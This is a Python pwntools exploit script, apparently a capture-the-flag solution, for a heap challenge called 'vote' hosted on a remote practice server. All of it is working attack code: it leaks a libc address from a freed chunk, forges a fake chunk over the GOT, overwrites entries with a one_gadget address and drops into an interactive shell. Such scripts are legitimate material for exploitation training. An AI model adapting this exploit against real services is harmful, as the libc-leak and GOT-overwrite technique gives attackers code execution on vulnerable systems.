#!/usr/bin/env python
from pwn import*
import time

local =0
debug = 1

if local:
    p = process('./vote')

else:
    p = remote("node3.buuoj.cn",28432)

#context.log_level = 'debug'

def create(num,name):
    p.recvuntil("Action:")
    p.sendline("0")
    p.recvuntil("Please enter the name's size:")
    p.sendline(str(num))
    p.recvuntil("Please enter the name: ")
    p.sendline(name)

def show(num):
    p.recvuntil("Action:")
    p.sendline("1")
    p.recvuntil("Please enter the index:")
    p.sendline(str(num))

def vote(num):
    p.recvuntil("Action:")
    p.sendline("2")
    p.recvuntil("Please enter the index:")
    p.sendline(str(num))

def cancel(num):
    p.recvuntil("Action:")
    p.sendline("4")
    p.recvuntil("Please enter the index:")
    p.sendline(str(num))
def result():
    p.recvuntil("Action:")
    p.sendline("3")

def add(num,i):
    for i in range(0,i):
        vote(str(num))

#---------------leak addr----------------------------

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
ppp = libc.symbols['write']
print "write=",hex(ppp)

#print "HHHHHHHHHHHHHHHHHHHHHHHHHHHHHH"
#raw_input()


create(0x80,"AAAA")
create(0x80,"BBBB")
cancel(0)

#add(0,16)
#vote(0)
#time.sleep(4)
show(0)

p.recvuntil("count:")
main_arena = p.recv(16)
#main_arena = p.read(15)
print"main_arena =",str(main_arena)

libc_addr = int(main_arena)-0x3c4b78
one = libc_addr + 0x4526a

print "libc_addr=",hex(libc_addr)
print "one=",hex(one)



#time.sleep(5)

#---------------fake heap----------------------------
#add(0,16)
got_pthread = 0x601ffa #0x602020
print "got_pthread:",hex(got_pthread)

payload = p64(0x60)+p64(got_pthread) +p64(0xabcdef)

create(0x40,payload)
create(0x40,"DDDD")

cancel(2)
cancel(3)

add(3,24)
create(0x40,"FF")

#---------------shellcode----------------------------

#write = libc_addr +0x3da490
write = libc_addr +libc.symbols['write']
#strlen = libc_addr +0x8b720
strlen = libc_addr +libc.symbols['strlen']
shellcode =  "AAAAAA"+ p64(one) + p64(write) + p64(strlen)
#shellcode = "AAAAAA"

create(0x40,"GG")

create(0x40,shellcode)

vote(0)


#gdb.attach(p)
p.interactive()